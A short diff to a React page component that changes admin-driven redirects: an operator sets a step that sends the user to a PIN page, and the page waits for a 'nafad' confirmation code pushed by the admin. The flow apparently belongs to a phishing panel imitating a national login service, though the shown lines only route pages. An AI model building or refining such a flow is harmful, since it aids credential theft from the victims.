@@ -54,11 +54,9 @@ export default function Component() {
           } else if (data.currentStep === "pin") {
             console.log("[nafad] Admin redirecting to pin")
             window.location.href = "/confi"
-          } else if (typeof data.currentStep === 'number') {
-            console.log("[nafad] Admin redirecting to home with step:", data.currentStep)
-            window.location.href = `/`
           }
-          // If currentStep === "nafad", stay on this page
+          // Numeric currentStep (from main.tsx internal step tracking) is ignored.
+          // If currentStep === "nafad" (or any other value), stay on this page
 
           // Listen for confirmation code from admin (updates every time)
           if (data.nafadConfirmationCode) {
